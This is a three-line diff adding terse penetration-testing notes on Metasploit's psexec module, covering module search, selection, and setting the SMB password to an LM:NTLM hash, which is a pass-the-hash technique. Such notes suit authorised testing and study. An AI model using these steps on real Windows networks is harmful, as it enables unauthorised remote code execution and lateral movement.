@@ -1,0 +1,3 @@
+search psexec 
+  use 9 (exploit/windows/smb/psexec authenticated user code execution)
+    set options (set smbpass can be a hash lmhash:ntlmhash)
